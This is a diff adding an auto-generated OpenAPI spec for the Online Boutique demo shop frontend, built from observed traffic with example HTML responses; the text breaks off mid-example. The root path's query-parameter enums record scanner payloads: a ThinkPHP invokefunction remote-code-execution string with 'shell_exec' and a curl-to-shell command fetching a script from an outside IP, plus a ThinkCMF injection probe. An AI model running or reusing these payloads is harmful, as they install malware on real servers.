@@ -1,0 +1,330 @@
+{
+ "info": {
+  "title": "http://frontend-external.default",
+  "version": "0.0"
+ },
+ "openapi": "3.0.2",
+ "paths": {
+  "/": {
+   "get": {
+    "operationId": "48fb4dac-625c-450b-9a8e-89ebd2d6baa9",
+    "parameters": [
+     {
+      "in": "query",
+      "name": "XDEBUG_SESSION_START",
+      "required": false,
+      "schema": {
+       "enum": [
+        "phpstorm"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "function",
+      "required": false,
+      "schema": {
+       "enum": [
+        "call_user_func_array"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "s",
+      "required": false,
+      "schema": {
+       "enum": [
+        "/Index/\\think\\app/invokefunction"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "vars[0]",
+      "required": false,
+      "schema": {
+       "enum": [
+        "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh",
+        "shell_exec"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "a",
+      "required": false,
+      "schema": {
+       "enum": [
+        "fetch"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "content",
+      "required": false,
+      "schema": {
+       "enum": [
+        "<php>die(@md5(HelloThinkCMF))</php>"
+       ],
+       "type": "string"
+      }
+     }
+    ],
+    "responses": {
+     "200": {
+      "content": {
+       "text/html": {
+        "example": "\n\n\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Online Boutique</title>\n    <link href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\"\n        crossorigin=\"anonymous\">\n    <link href=\"https://fonts.googleapis.com/css?family=Roboto:300,400,500,700\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/cart.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/order.css\">\n    <link rel='shortcut icon' type='image/x-icon' href='/static/favicon.ico' />\n</head>\n\n<body>\n    <header>\n        <div class=\"navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <div class=\"h-free-shipping\">Free shipping with $75 purchase! &nbsp;&nbsp;</div>\n\n\n                \n                <div class=\"h-controls\">\n                    <div class=\"h-control\">\n                        <img src=\"/static/icons/Hipster_CurrencyIcon.svg\" alt=\"icon\" class=\"icon\" />\n                        <form method=\"POST\" class=\"controls-form\" action=\"/setCurrency\" id=\"currency_form\" >\n                            <select name=\"currency_code\" onchange=\"document.getElementById('currency_form').submit();\">\n                                    \n                                <option value=\"EUR\" >EUR</option>\n                                \n                                <option value=\"USD\" selected=\"selected\">USD</option>\n                                \n                                <option value=\"JPY\" >JPY</option>\n                                \n                                <option value=\"GBP\" >GBP</option>\n                                \n                                <option value=\"TRY\" >TRY</option>\n                                \n                                <option value=\"CAD\" >CAD</option>\n                                \n                            </select>\n                        </form>\n                        <img src=\"/static/icons/Hipster_DownArrow.svg\" alt=\"icon\" class=\"icon arrow\" />\n                    </div>\n                </div>\n                \n\n            </div>\n        </div>\n        <div class=\"navbar sub-navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <a href=\"/\" class=\"navbar-brand d-flex align-items-center\">\n                    <img src=\"/static/icons/Hipster_NavLogo.svg\" alt=\"logo\" class=\"logo\" />\n                </a>\n                <div class=\"controls\">\n                    <a href=\"/cart\">\n                        <img src=\"/static/icons/Hipster_CartIcon.svg\" alt=\"cart-icon\" class=\"logo\" />\n                        <span>Cart\n                            \n                        </span>\n                    </a>\n                </div>\n            </div>\n        </div>\n\n    </header>\n    \n<div  class=\"gcp-platform\" >\n  <span class=\"platform-flag\">\n    Google Cloud\n  </span>\n</div>\n<main role=\"main\" class=\"home\">\n  <section class=\"jumbotron text-center mb-0 h-jumbotron\">\n    <div class=\"container\">\n      <img src=\"/static/icons/Hipster_HeroLogo.svg\" alt=\"icon\" class=\"icon search-icon\" />\n    </div>\n  </section>\n\n  <div class=\"h-grid py-5 bg-light\">\n    <div class=\"container\">\n      <div class=\"row h-row\">\n        <img src=\"/static/icons/Hipster_HotProducts.svg\" alt=\"icon\" class=\"icon search-icon\" />\n      </div>\n      <div class=\"row\">\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/OLJCESPC7Z\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/typewriter.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Vintage Typewriter\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 67.98\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/66VCHSJNUP\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/camera-lens.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Vintage Camera Lens\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 12.48\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/1YMWWN1N4O\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/barista-kit.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Home Barista Kit\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 123.99\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/L9ECAV7KIM\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/terrarium.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Terrarium\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 36.44\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/2ZYFJ3GM2N\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/film-camera.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Film Camera\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 2244.99\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/0PUK6V6EV0\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/record-player.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Vintage Record Player\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 65.50\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/LS4PSXUNUM\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/camp-mug.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Metal Camping Mug\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 24.33\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/9SIQT8TOJO\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/city-bike.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                City Bike\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 789.50\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n        <div class=\"col-md-4\">\n          <div class=\"h-card card mb-4 box-shadow\">\n            <a href=\"/product/6E92ZMYYFZ\">\n              <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/air-plant.jpg\">\n              <div class=\"card-hover\"></div>\n            </a>\n            <div class=\"card-body h-card-body\">\n              <h5 class=\"card-title h-card-title\">\n                Air Plant\n              </h5>\n              <div class=\"d-flex justify-content-center align-items-center\">\n                <small class=\"text-muted\">\n                  USD 12.29\n                </small>\n              </div>\n            </div>\n          </div>\n        </div>\n        \n      </div>\n    </div>\n  </div>\n</main>\n\n\n\n<footer class=\"py-5\">\n    <div class=\"footer-top\">\n        <div class=\"container footer-social\">\n            <p class=\"footer-text\">This website is hosted for demo purposes only. It is not an actual shop. This is not a Google product.</p>\n            <p class=\"footer-text\">\u00a9 2020 Google Inc (<a href=\"https://github.com/GoogleCloudPlatform/microservices-demo\">Source Code</a>)</p>\n            <p class=\"footer-text\">\n                <small>\n                    session-id: 00758a77-51bb-4675-84a3-0f26b5291c38 \u2014 \n                    request-id: 033fac8a-e3ea-482d-96c3-03f0c71abc6e\n                </small>\n            </p>\n        </div>\n    </div>\n</footer>\n<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\n    integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\">\n</script>\n</body>\n\n</html>\n\n\n"
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 105649 requests"
+   },
+   "head": {
+    "operationId": "0c010e71-3e92-4df2-8d1d-7f17aebb9c84",
+    "parameters": [],
+    "responses": {
+     "200": {
+      "content": {
+       "text/html": {
+        "example": ""
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 1 requests"
+   },
+   "parameters": []
+  },
+  "/_healthz": {
+   "get": {
+    "operationId": "4daab162-c410-42f1-a0cd-ae87f7510e33",
+    "parameters": [],
+    "responses": {
+     "200": {
+      "content": {
+       "text/plain": {
+        "example": "ok"
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 47924 requests"
+   },
+   "parameters": []
+  },
+  "/cart": {
+   "get": {
+    "operationId": "8a631952-6079-4e02-afc6-801c883cfe6c",
+    "parameters": [],
+    "responses": {
+     "200": {
+      "content": {
+       "text/html": {
+        "example": "\n    \n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Online Boutique</title>\n    <link href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\"\n        crossorigin=\"anonymous\">\n    <link href=\"https://fonts.googleapis.com/css?family=Roboto:300,400,500,700\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/cart.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/order.css\">\n    <link rel='shortcut icon' type='image/x-icon' href='/static/favicon.ico' />\n</head>\n\n<body>\n    <header>\n        <div class=\"navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <div class=\"h-free-shipping\">Free shipping with $75 purchase! &nbsp;&nbsp;</div>\n\n\n                \n                <div class=\"h-controls\">\n                    <div class=\"h-control\">\n                        <img src=\"/static/icons/Hipster_CurrencyIcon.svg\" alt=\"icon\" class=\"icon\" />\n                        <form method=\"POST\" class=\"controls-form\" action=\"/setCurrency\" id=\"currency_form\" >\n                            <select name=\"currency_code\" onchange=\"document.getElementById('currency_form').submit();\">\n                                    \n                                <option value=\"EUR\" >EUR</option>\n                                \n                                <option value=\"USD\" >USD</option>\n                                \n                                <option value=\"JPY\" selected=\"selected\">JPY</option>\n                                \n                                <option value=\"GBP\" >GBP</option>\n                                \n                                <option value=\"TRY\" >TRY</option>\n                                \n                                <option value=\"CAD\" >CAD</option>\n                                \n                            </select>\n                        </form>\n                        <img src=\"/static/icons/Hipster_DownArrow.svg\" alt=\"icon\" class=\"icon arrow\" />\n                    </div>\n                </div>\n                \n\n            </div>\n        </div>\n        <div class=\"navbar sub-navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <a href=\"/\" class=\"navbar-brand d-flex align-items-center\">\n                    <img src=\"/static/icons/Hipster_NavLogo.svg\" alt=\"logo\" class=\"logo\" />\n                </a>\n                <div class=\"controls\">\n                    <a href=\"/cart\">\n                        <img src=\"/static/icons/Hipster_CartIcon.svg\" alt=\"cart-icon\" class=\"logo\" />\n                        <span>Cart\n                            \n                        </span>\n                    </a>\n                </div>\n            </div>\n        </div>\n\n    </header>\n    \n    <div  class=\"gcp-platform\" >\n        <span class=\"platform-flag\">\n          Google Cloud\n        </span>\n      </div>\n    <main role=\"main\" class=\"cart\">\n        <div class=\"cart-bg\">\n            <div class=\"container py-3 px-lg-5 py-lg-5\">\n                \n                    <h3>Your shopping cart is empty!</h3>\n                    <p>Items you add to your shopping cart will appear here.</p>\n                    <a class=\"btn btn-info\" href=\"/\" role=\"button\">Browse Products &rarr; </a>\n                 \n\n            </div>\n            \n                \n<section class=\"recommendations\">\n    <div class=\"container\">\n      <div class=\"image\">\n        <img src=\"/static/icons/Hipster_OtherProducts.svg\" alt=\"icon\" />\n      </div>\n      <div class=\"row prods\">\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/1YMWWN1N4O\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/barista-kit.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Home Barista Kit\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/66VCHSJNUP\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/camera-lens.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Vintage Camera Lens\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/LS4PSXUNUM\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/camp-mug.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Metal Camping Mug\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/9SIQT8TOJO\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/city-bike.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  City Bike\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n        </div>\n    </div>\n</section>\n\n            \n        </div>\n    </main>\n    \n\n<footer class=\"py-5\">\n    <div class=\"footer-top\">\n        <div class=\"container footer-social\">\n            <p class=\"footer-text\">This website is hosted for demo purposes only. It is not an actual shop. This is not a Google product.</p>\n            <p class=\"footer-text\">\u00a9 2020 Google Inc (<a href=\"https://github.com/GoogleCloudPlatform/microservices-demo\">Source Code</a>)</p>\n            <p class=\"footer-text\">\n                <small>\n                    session-id: 841886e2-da90-4bdd-b5d0-3fa5aacaef04 \u2014 \n                    request-id: 2331010b-e945-47ea-998c-4d5fd91fe590\n                </small>\n            </p>\n        </div>\n    </div>\n</footer>\n<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\n    integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\">\n</script>\n</body>\n\n</html>\n\n    "
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 211566 requests",
+    "tags": [
+     "cart"
+    ]
+   },
+   "parameters": [],
+   "post": {
+    "operationId": "b405ff0b-158a-4511-bf36-669e770e89d2",
+    "parameters": [],
+    "requestBody": {
+     "content": {
+      "application/x-www-form-urlencoded": {
+       "schema": {
+        "properties": {
+         "product_id": {
+          "type": "string"
+         },
+         "quantity": {
+          "type": "string"
+         }
+        },
+        "required": [
+         "product_id",
+         "quantity"
+        ],
+        "type": "object"
+       }
+      }
+     },
+     "required": true
+    },
+    "responses": {
+     "302": {
+      "description": "Found"
+     }
+    },
+    "summary": "Seen 105936 requests",
+    "tags": [
+     "cart"
+    ]
+   }
+  },
+  "/cart/checkout": {
+   "parameters": [],
+   "post": {
+    "operationId": "1124639f-76fb-4ae5-bfee-53aee8626959",
+    "parameters": [],
+    "requestBody": {
+     "content": {
+      "application/x-www-form-urlencoded": {
+       "schema": {
+        "properties": {
+         "city": {
+          "type": "string"
+         },
+         "country": {
+          "type": "string"
+         },
+         "credit_card_cvv": {
+          "type": "string"
+         },
+         "credit_card_expiration_month": {
+          "type": "string"
+         },
+         "credit_card_expiration_year": {
+          "type": "string"
+         },
+         "credit_card_number": {
+          "type": "string"
+         },
+         "email": {
+          "type": "string"
+         },
+         "state": {
+          "type": "string"
+         },
+         "street_address": {
+          "type": "string"
+         },
+         "zip_code": {
+          "type": "string"
+         }
+        },
+        "required": [
+         "city",
+         "country",
+         "credit_card_cvv",
+         "credit_card_expiration_month",
+         "credit_card_expiration_year",
+         "credit_card_number",
+         "email",
+         "state",
+         "street_address",
+         "zip_code"
+        ],
+        "type": "object"
+       }
+      }
+     },
+     "required": true
+    },
+    "responses": {
+     "200": {
+      "content": {
+       "text/html": {
+        "example": "\n    \n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Online Boutique</title>\n    <link href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\"\n        crossorigin=\"anonymous\">\n    <link href=\"https://fonts.googleapis.com/css?family=Roboto:300,400,500,700\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/cart.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/order.css\">\n    <link rel='shortcut icon' type='image/x-icon' href='/static/favicon.ico' />\n</head>\n\n<body>\n    <header>\n        <div class=\"navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <div class=\"h-free-shipping\">Free shipping with $75 purchase! &nbsp;&nbsp;</div>\n\n\n                \n\n            </div>\n        </div>\n        <div class=\"navbar sub-navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <a href=\"/\" class=\"navbar-brand d-flex align-items-center\">\n                    <img src=\"/static/icons/Hipster_NavLogo.svg\" alt=\"logo\" class=\"logo\" />\n                </a>\n                <div class=\"controls\">\n                    <a href=\"/cart\">\n                        <img src=\"/static/icons/Hipster_CartIcon.svg\" alt=\"cart-icon\" class=\"logo\" />\n                        <span>Cart\n                            \n                        </span>\n                    </a>\n                </div>\n            </div>\n        </div>\n\n    </header>\n    \n    <div  class=\"gcp-platform\" >\n        <span class=\"platform-flag\">\n          Google Cloud\n        </span>\n      </div>\n    <main role=\"main\" class=\"order\">\n        <div class=\"py-5\">\n            <div class=\"container py-3 px-lg-5\">\n                <div class=\"row mt-5 py-2\">\n                    <div class=\"col text-center\">\n                        <img class=\"order-logo\" src=\"/static/icons/Hipster_HeroLogoCyan.svg\" alt=\"icon\" />\n                        <h3>\n                            Your order is complete!\n                        </h3>\n                        <p>Order Confirmation ID</p>\n                        <p class=\"mg-bt\"><strong>22659664-841d-11eb-bdf4-2e6bdd079e28</strong></p>\n                        <p>Shipping Tracking ID</p>\n                        <p class=\"mg-bt\"><strong>PN-44143-224219695</strong></p>\n                        <p>Shipping Cost</p>\n                        <p class=\"mg-bt\"><strong>CAD 105.74</strong></p>\n                        <p>Total Paid</p>\n                        <p class=\"mg-bt\"><strong>CAD 17677.89</strong></p>\n                    </div>\n                </div>\n\n            </div>\n            <div class=\"container py-3 px-lg-5\">\n                <div class=\"row py-2 text-center\">\n                    <a class=\"btn btn-info\" href=\"/\" role=\"button\" style=\"margin-top: 40px; margin-bottom: 40px;\">Keep Browsing</a>\n                </div>\n            </div>\n            \n        </div>\n    </main>\n\n    \n\n<footer class=\"py-5\">\n    <div class=\"footer-top\">\n        <div class=\"container footer-social\">\n            <p class=\"footer-text\">This website is hosted for demo purposes only. It is not an actual shop. This is not a Google product.</p>\n            <p class=\"footer-text\">\u00a9 2020 Google Inc (<a href=\"https://github.com/GoogleCloudPlatform/microservices-demo\">Source Code</a>)</p>\n            <p class=\"footer-text\">\n                <small>\n                    session-id: 78eec8fb-9336-4d0e-9d6a-40c1937c26df \u2014 \n                    request-id: 5715e0d2-d44a-4856-a558-dc197ec16ebf\n                </small>\n            </p>\n        </div>\n    </div>\n</footer>\n<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\n    integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\">\n</script>\n</body>\n\n</html>\n\n    "
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 35073 requests",
+    "tags": [
+     "cart"
+    ]
+   }
+  },
+  "/product/{href}": {
+   "get": {
+    "operationId": "5f11ec2c-f599-427c-8c35-9baa7b18c3c9",
+    "parameters": [],
+    "responses": {
+     "200": {
+      "content": {
+       "text/html": {
+        "example": "\n\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Online Boutique</title>\n    <link href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\"\n        crossorigin=\"anonymous\">\n    <link href=\"https://fonts.googleapis.com/css?family=Roboto:300,400,500,700\" rel=\"stylesheet\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/cart.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/order.css\">\n    <link rel='shortcut icon' type='image/x-icon' href='/static/favicon.ico' />\n</head>\n\n<body>\n    <header>\n        <div class=\"navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <div class=\"h-free-shipping\">Free shipping with $75 purchase! &nbsp;&nbsp;</div>\n\n\n                \n                <div class=\"h-controls\">\n                    <div class=\"h-control\">\n                        <img src=\"/static/icons/Hipster_CurrencyIcon.svg\" alt=\"icon\" class=\"icon\" />\n                        <form method=\"POST\" class=\"controls-form\" action=\"/setCurrency\" id=\"currency_form\" >\n                            <select name=\"currency_code\" onchange=\"document.getElementById('currency_form').submit();\">\n                                    \n                                <option value=\"EUR\" >EUR</option>\n                                \n                                <option value=\"USD\" >USD</option>\n                                \n                                <option value=\"JPY\" selected=\"selected\">JPY</option>\n                                \n                                <option value=\"GBP\" >GBP</option>\n                                \n                                <option value=\"TRY\" >TRY</option>\n                                \n                                <option value=\"CAD\" >CAD</option>\n                                \n                            </select>\n                        </form>\n                        <img src=\"/static/icons/Hipster_DownArrow.svg\" alt=\"icon\" class=\"icon arrow\" />\n                    </div>\n                </div>\n                \n\n            </div>\n        </div>\n        <div class=\"navbar sub-navbar\">\n            <div class=\"container d-flex justify-content-between\">\n                <a href=\"/\" class=\"navbar-brand d-flex align-items-center\">\n                    <img src=\"/static/icons/Hipster_NavLogo.svg\" alt=\"logo\" class=\"logo\" />\n                </a>\n                <div class=\"controls\">\n                    <a href=\"/cart\">\n                        <img src=\"/static/icons/Hipster_CartIcon.svg\" alt=\"cart-icon\" class=\"logo\" />\n                        <span>Cart\n                            \n                        </span>\n                    </a>\n                </div>\n            </div>\n        </div>\n\n    </header>\n    \n<div  class=\"gcp-platform\" >\n  <span class=\"platform-flag\">\n    Google Cloud\n  </span>\n</div>\n\n<main role=\"main\">\n  <div class=\"h-product\">\n    <div class=\"row\">\n      <div class=\"col\">\n        <img src=\"/static/img/products/air-plant.jpg\" />\n      </div>\n      <div class=\"product-info col\">\n        <div class=\"product-wrapper\">\n          <h2>Air Plant</h2>\n\n          <p class=\"text-muted\">\n            JPY 1375.24\n          </p>\n          <div>\n            <h6>Product Description:</h6>\n            Have you ever wondered whether air plants need water? Buy one and figure out.\n          </div>\n\n          <form method=\"POST\" action=\"/cart\" class=\"form-inline\">\n            <input type=\"hidden\" name=\"product_id\" value=\"6E92ZMYYFZ\" />\n            <div class=\"input-group\">\n              <div class=\"input-group-prepend\">\n                <label class=\"input-group-text\" for=\"quantity\">Quantity</label>\n              </div>\n              <select name=\"quantity\" id=\"quantity\" class=\"custom-select form-control form-control-lg\">\n                <option>1</option>\n                <option>2</option>\n                <option>3</option>\n                <option>4</option>\n                <option>5</option>\n                <option>10</option>\n              </select>\n              <button type=\"submit\" class=\"btn btn-info btn-lg ml-3\">Add to Cart</button>\n            </div>\n          </form>\n        </div>\n      </div>\n    </div>\n  </div>\n  <div class=\"container py-3 px-lg-5 py-lg-5\">\n    \n      \n<section class=\"recommendations\">\n    <div class=\"container\">\n      <div class=\"image\">\n        <img src=\"/static/icons/Hipster_OtherProducts.svg\" alt=\"icon\" />\n      </div>\n      <div class=\"row prods\">\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/9SIQT8TOJO\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/city-bike.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  City Bike\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/0PUK6V6EV0\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/record-player.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Vintage Record Player\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/2ZYFJ3GM2N\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/film-camera.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Film Camera\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n          <div class=\"col-md-3\">\n            <div class=\"h-card card mb-3 box-shadow\">\n              <a href=\"/product/L9ECAV7KIM\">\n                <img alt=\"\" style=\"width: 100%; height: auto;\" src=\"/static/img/products/terrarium.jpg\">\n                <div class=\"card-hover\"></div>\n              </a>\n              <div class=\"card-body text-center py-2\">\n                <h5 class=\"card-title h-card-title\">\n                  Terrarium\n                </h5>\n              </div>\n            </div>\n          </div>\n          \n        </div>\n    </div>\n</section>\n\n    \n\n   \n<div class=\"container\">\n    <div class=\"alert alert-dark\" role=\"alert\">\n        <strong>Advertisement:</strong>\n        <a href=\"/product/6E92ZMYYFZ\" 